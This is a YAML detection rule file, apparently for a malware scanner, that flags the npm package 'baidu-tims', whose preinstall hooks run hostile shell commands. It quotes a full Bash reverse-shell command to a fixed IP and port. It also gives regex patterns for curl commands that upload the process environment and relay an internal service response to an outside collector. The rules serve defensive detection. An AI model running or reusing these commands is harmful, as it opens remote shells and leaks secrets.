# baidu-tims releases execute untrusted shell commands from preinstall.
defaults:
  platforms: [unix]
  for: [javascript, package.json]
  attack: T1195.002,T1059.004,T1041
  mbc: F0012,E1041

traits:
  - id: baidu-tims-bash-tcp-reverse-shell
    desc: Opens Bash reverse shell to fixed IP
    crit: suspicious
    conf: 0.999
    for: [javascript]
    if:
      type: text
      substr: 'bash -i >& /dev/tcp/106.13.48.147/7777 0>&1'

  - id: baidu-tims-whole-environment-curl-upload
    desc: Uploads full process environment via curl
    crit: hostile
    conf: 0.999
    for: [javascript]
    if:
      type: text
      regex: '(?is)env\s*\|\s*curl\s+-F\s+["'']data=@-["'']\s+\S+'

  - id: baidu-tims-curl-posts-shell-environment
    desc: Posts shell environment through curl
    crit: hostile
    conf: 0.999
    for: [javascript]
    if:
      type: text
      regex: 'curl\s+-X\s+POST\s+-d\s+["'']?`env`["'']?\s+\S+'

  - id: baidu-tims-malformed-env-curl-form-upload
    desc: Malformed curl environment form upload
    crit: suspicious
    conf: 0.95
    for: [javascript]
    if:
      type: text
      regex: '(?is)env\s*\|\s*curl\s+-F\s+["'']data=@-["'']\S+'

  - id: baidu-tims-internal-response-relayed-out
    desc: Curl pipes private URL response to curl
    crit: suspicious
    conf: 0.999
    for: [javascript]
    if:
      type: text
      regex: 'curl.{0,80}10\.169\.4\.131/123.{0,30}\|\s*curl'

  - id: baidu-tims-cvssadvisor-curl-stdin-upload
    desc: Curl uploads piped stdin to SSRF collector
    crit: suspicious
    conf: 0.999
    for: [javascript]
    if:
      type: text
      regex: '\|\s*curl.{0,120}(cvssadvisor\.com.{0,40}-d.{0,20}@ -|-d.{0,20}@-.{0,80}cvssadvisor\.com)'

composite_rules:
  - id: npm-baidu-tims-preinstall-reverse-shell
    desc: npm preinstall opens a Bash reverse shell
    crit: hostile
    conf: 0.999
    scope: archive
    for: [npm, zip, tar, package.json, javascript]
    all:
      - id: metadata/package/scripts/lifecycle::filtered-preinstall-hook
      - id: baidu-tims-bash-tcp-reverse-shell

  - id: npm-baidu-tims-preinstall-environment-exfil
    desc: npm preinstall uploads the process environment
    crit: hostile
    conf: 0.999
    scope: archive
    for: [npm, zip, tar, package.json, javascript]
    all:
      - id: metadata/package/scripts/lifecycle::filtered-preinstall-hook
      - id: baidu-tims-whole-environment-curl-upload

  - id: npm-baidu-tims-preinstall-ssrf-relay
    desc: npm preinstall relays an internal service response externally
    crit: hostile
    conf: 0.999
    scope: archive
    for: [npm, zip, tar, package.json, javascript]
    all:
      - id: metadata/package/scripts/lifecycle::filtered-preinstall-hook
      - id: baidu-tims-internal-response-relayed-out

  - id: node-curl-private-response-collector-upload
    desc: Uploads an internal curl response to a collector
    crit: hostile
    conf: 0.999
    for: [javascript]
    near_bytes: 500
    all:
      - id: baidu-tims-internal-response-relayed-out
      - id: baidu-tims-cvssadvisor-curl-stdin-upload
